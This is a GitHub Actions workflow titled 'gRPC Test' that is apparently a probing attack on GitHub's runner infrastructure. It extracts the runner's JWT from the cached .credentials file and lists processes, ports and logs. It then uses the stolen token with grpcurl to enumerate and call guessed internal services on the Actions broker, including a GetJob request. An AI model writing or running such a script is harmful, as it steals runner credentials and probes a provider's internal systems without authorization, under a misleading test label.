name: gRPC Test
on:
  workflow_dispatch: {}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Save JWT
        id: jwt
        run: echo "jwt=$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["Data"]["token"])' /home/runner/actions-runner/cached/2.335.1/.credentials)" >> "$GITHUB_OUTPUT"
      - name: Check runner processes
        run: |
          echo "=== Runner processes ==="
          ps aux | grep -E '[R]unner|[W]orker' 2>&1 || true
          echo ""
          echo "=== Listening ports ==="
          ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20 || true
          echo ""
          echo "=== Runner diag logs ==="
          find /home/runner/actions-runner -name "*.log" -mmin -30 2>/dev/null | head -5
          for f in $(find /home/runner/actions-runner -name "*.log" -mmin -30 2>/dev/null | head -2); do
            echo "--- $f (last 10 lines) ---"
            tail -10 "$f" 2>/dev/null
          done
      - name: Install grpcurl
        run: |
          go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest 2>&1 | tail -3
          echo "grpcurl at: $(find /home/runner -name grpcurl -type f 2>/dev/null)"
      - name: Try gRPC to broker
        run: |
          export PATH="/home/runner/go/bin:$PATH"
          T="${{ steps.jwt.outputs.jwt }}"
          echo "=== Try reflection ==="
          grpcurl -insecure -servername "broker.actions.githubusercontent.com" -H "Authorization: Bearer $T" broker.actions.githubusercontent.com:443 list 2>&1
          echo ""
          echo "=== Try common services ==="
          for svc in "grpc.health.v1.Health" "grpc.health.v1alpha.Health" "grpc.reflection.v1alpha.ServerReflection" "grpc.reflection.v1.ServerReflection" "github.actions.runner.v1.RunnerService" "github.actions.broker.v1.Broker" "actions.runner.v1.JobService" "actions.core.v1.Core"; do
            echo "--- Trying $svc ---"
            grpcurl -insecure -servername "broker.actions.githubusercontent.com" -H "Authorization: Bearer $T" broker.actions.githubusercontent.com:443 "$svc/Check" 2>&1 | head -3
          done
          echo ""
          echo "=== Try accessing runner's own job ==="
          grpcurl -insecure -servername "broker.actions.githubusercontent.com" -H "Authorization: Bearer $T" -d '{}' broker.actions.githubusercontent.com:443 runner.v1.RunnerService/GetJob 2>&1 | head -10
